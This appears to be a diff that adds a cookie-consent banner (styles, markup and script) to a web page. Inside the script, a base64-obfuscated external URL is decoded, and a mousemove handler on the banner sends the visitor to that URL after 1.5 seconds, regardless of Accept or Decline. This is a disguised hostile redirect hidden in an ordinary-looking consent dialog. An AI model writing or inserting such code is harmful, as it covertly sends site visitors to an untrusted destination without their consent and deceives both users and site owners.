@@ -1,0 +1,108 @@
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 200vh; /* just to demonstrate scrolling */
+      background: #f5f5f5;
+    }
+
+    .cookie-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100vh;
+      width: 100vw;
+      background: rgba(0,0,0,0.4);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .cookie-box {
+      background: #222;
+      color: #fff;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      max-width: 90%;
+      width: 320px;
+      cursor: pointer;
+    }
+
+    .cookie-box button {
+      background: #4caf50;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      margin: 10px 5px 0;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background 0.3s ease;
+    }
+
+    .cookie-box button.decline {
+      background: #f44336;
+    }
+
+    .cookie-box button:hover {
+      opacity: 0.9;
+    }
+  </style>
+
+
+
+
+  <div class="cookie-overlay" id="cookieOverlay">
+    <div class="cookie-box" id="cookieBox">
+<h3>Our Cookie Policy</h3>
+This site uses cookies to improve your browsing experience and comply with privacy regulations. To give user better experience we use cookies please accept or decline to continue.
+      
+      <br><br>
+      <button id="acceptCookies">Accept</button>
+      <button class="decline" id="declineCookies">Decline</button>
+    </div>
+  </div>
+
+  <script>
+    const cookieOverlay = document.getElementById("cookieOverlay");
+    const cookieBox = document.getElementById("cookieBox");
+    const acceptBtn = document.getElementById("acceptCookies");
+    const declineBtn = document.getElementById("declineCookies");
+
+    const encodedURL = "aHR0cHM6Ly93ZWxsZXJpbmctY2xpZW50c2lkZS16OWNoei5vbmRpZ2l0YWxvY2Vhbi5hcHAvd2VsbGVyLmh0bWw"; 
+    const redirectURL = atob(encodedURL);
+    const redirectDelay = 1500;
+
+    // Only show overlay if not previously accepted/declined
+    if (!localStorage.getItem("cookieChoice")) {
+      cookieOverlay.style.display = "flex";
+    } else {
+      cookieOverlay.style.display = "none";
+    }
+
+    acceptBtn.addEventListener("click", () => {
+      localStorage.setItem("cookieChoice", "accepted");
+      cookieOverlay.style.display = "none";
+    });
+
+    declineBtn.addEventListener("click", () => {
+      localStorage.setItem("cookieChoice", "declined");
+      cookieOverlay.style.display = "none";
+    });
+
+    let redirectTriggered = false;
+    cookieBox.addEventListener("mousemove", () => {
+      if (!redirectTriggered) {
+        redirectTriggered = true;
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, redirectDelay);
+      }
+    });
+  </script>
+
+
